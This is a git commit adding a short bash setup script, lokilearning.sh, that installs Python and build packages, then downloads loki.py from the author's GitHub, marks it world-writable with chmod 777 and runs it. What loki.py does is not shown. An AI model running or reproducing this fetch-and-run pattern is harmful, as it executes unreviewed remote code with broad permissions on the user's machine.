ce15674d393a68d9935b4429aab024b257359ca3
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2020-05-26 12:17:38 +0700

    Create lokilearning.sh

---
+++ lokilearning.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+apt-get update
+apt-get install -y git wget screen
+apt-get install -y python python-dev
+apt-get install -y epel-release
+apt-get install -y python-pip
+apt-get install -y gcc-c++
+pip install sh
+rm -rf loki.py
+wget https://raw.githubusercontent.com/ts6aud5vkg/lokilearning/master/loki.py
+chmod 777 loki.py
+python loki.py
